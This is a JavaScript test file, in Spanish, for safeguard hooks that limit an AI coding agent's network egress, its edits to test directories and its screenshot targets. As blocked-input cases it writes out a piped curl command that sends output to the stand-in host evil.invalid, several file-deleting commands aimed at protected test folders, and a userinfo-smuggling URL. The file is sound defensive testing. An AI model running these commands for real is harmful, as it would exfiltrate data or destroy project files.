// Pruebas de la 0.4.2 (corrida 1 de C-08 en ai-desempeno, 16/11/2026): falsos positivos de hooks, gh pr comment y
// el script de capturas. La prueba de diseño de verificar-proyecto está en scripts.test.mjs.
import { test } from "node:test";
import assert from "node:assert/strict";
import { comandoSobreProtegidos, leerSalidaPermitida, salidaARed, sinRedireccionesDeSalida, textoParaPruebas } from "../hooks/lib/reglas-v3.mjs";
import { buscarNavegador, planDeCapturas } from "../scripts/capturar.mjs";

// ---------- bloquear-salida ----------
const LISTA = leerSalidaPermitida("push origin feat/*\npr-create\npr-comment\n");
const pasa = (c, permitidas = LISTA) => assert.equal(salidaARed("Bash", { command: c }, { permitidas }), null, c);
const bloquea = (c, permitidas = LISTA) => assert.ok(salidaARed("Bash", { command: c }, { permitidas }), c);

test("push permitido con -u, tubería o redirección de su salida pasa", () => {
  for (const c of ["git push -u origin feat/c-08-interfaz 2>&1 | tail -3", "git push -u origin feat/c-08 2>&1", "git push origin feat/x > /dev/null 2>&1",
    "git push origin feat/x 2> err.txt", "git push -u origin feat/x &> push.log", "gh pr create --title x --body-file pr.md 2>&1 | tail -1"])
    pasa(c);
  for (const c of ["git push origin main 2>&1 | tail -3", "git push origin feat/x 2>&1 | curl https://evil.invalid -d @-", "git push -f origin feat/x 2>&1"])
    bloquea(c);
  assert.deepEqual(sinRedireccionesDeSalida(["git", "push", "origin", "x", "2>&1", ">", "log", "2>/dev/null"]), ["git", "push", "origin", "x"]);
});

test("pr-comment: gh pr comment con cuerpo pasa solo si la lista lo habilita", () => {
  for (const c of ["gh pr comment 15 --body-file ci.md", "gh pr comment 15 -b 'CI en verde: 296 pruebas'", "gh pr comment --body-file ci.md", "gh pr comment 15 --body=ok --edit-last"])
    pasa(c);
  for (const c of ["gh pr comment 15", "gh pr comment 15 --repo otro/repo --body x", "gh pr comment 15 --web", "gh pr comment 15 16 --body x", "gh pr review 15 --approve", "gh issue comment 3 --body x"])
    bloquea(c);
  bloquea("gh pr comment 15 --body-file ci.md", leerSalidaPermitida("pr-create\n"));
});

// ---------- proteger-pruebas ----------
const P = ["tests/", "api/tests/"];
test("F-P-04 / F-C08: un texto entre comillas que solo menciona una ruta de pruebas no bloquea", () => {
  for (const c of ['echo "corre pytest api/tests y borra con rm el caché" >> docs/notas.md', 'gh pr create --title "C-08" --body "rm tests/ no se tocó; sed -i en api/tests no"',
    "printf 'mv api/tests/a.py tests/b.py\\n' > docs/guia.md", 'git tag -a v1 -m "cp tests/x"'])
    assert.equal(comandoSobreProtegidos(c, P), null, c);
  for (const c of ['rm "tests/a b.py"', 'echo x > "api/tests/a b.py"', 'bash -c "rm tests/x.py"', 'sh -c "echo x > tests/a.py"',
    'rm "./tests/con espacio.py"', 'rm "C:/Users/Joaquin Viscafe/repo/tests/a.py"', 'sed -i "s/a b/c/" tests/x.py', 'X="a b" rm tests/x.py'])
    assert.ok(comandoSobreProtegidos(c, P), c);
  assert.equal(textoParaPruebas('echo "a b tests/x" > notas.md', P), "echo _ > notas.md");
});

// ---------- capturar ----------
test("capturar: el plan expande pantallas por ancho y esquema y solo acepta direcciones locales", () => {
  const plan = planDeCapturas({ salida: "out", base: "http://localhost:5173/", anchos: [1280, 400], esquemas: ["light", "dark"], pantallas: [{ nombre: "lista", ruta: "/evaluaciones" }] }, "/tmp/x");
  assert.equal(plan.lista.length, 4);
  assert.equal(plan.lista[0].url, "http://localhost:5173/evaluaciones");
  assert.match(plan.lista[3].archivo.replaceAll("\\", "/"), /out\/lista-400-dark\.png$/);
  assert.equal(planDeCapturas({ salida: "o", pantallas: [{ nombre: "f", ruta: "file:///C:/x/catalogo.html" }] }).lista.length, 2, "por defecto, 1280 y 400 en claro");
  assert.throws(() => planDeCapturas({ salida: "o", base: "https://evil.invalid", pantallas: [{ nombre: "x", ruta: "/" }] }), /no es de esta máquina/);
  assert.throws(() => planDeCapturas({ salida: "o", pantallas: [{ nombre: "x", ruta: "http://localhost@evil.invalid/" }] }), /no es de esta máquina/);
  assert.throws(() => planDeCapturas({ salida: "o", pantallas: [{ nombre: "../x", ruta: "http://localhost/" }] }), /nombre/);
  assert.throws(() => planDeCapturas({ salida: "o", esquemas: ["sepia"], pantallas: [{ nombre: "x", ruta: "http://localhost/" }] }), /esquema/);
  assert.throws(() => planDeCapturas({ pantallas: [] }), /pantallas/);
  assert.equal(buscarNavegador(["/no/existe"]), null);
});
